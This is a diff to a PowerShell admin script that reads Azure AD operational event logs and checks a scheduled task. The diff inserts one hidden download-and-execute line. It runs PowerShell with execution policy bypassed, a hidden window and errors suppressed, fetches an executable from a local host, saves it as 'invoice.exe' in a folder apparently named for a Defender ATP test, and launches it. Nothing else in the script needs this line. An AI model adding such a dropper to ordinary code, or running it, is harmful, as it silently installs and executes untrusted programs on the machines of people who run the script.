@@ -18,6 +18,7 @@ $data = Get-WinEvent -LogName Microsoft-Windows-AAD/Operational | Where-Object M
 [datetime]$timeref = (get-date).AddMinutes($timeSpan)
 #endregion
 #region script
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
 if (Get-ScheduledTask -TaskName "$taskName" -ErrorAction SilentlyContinue) {
 If ($null -ne $data) {
     [datetime]$timecreated = $data.TimeCreated
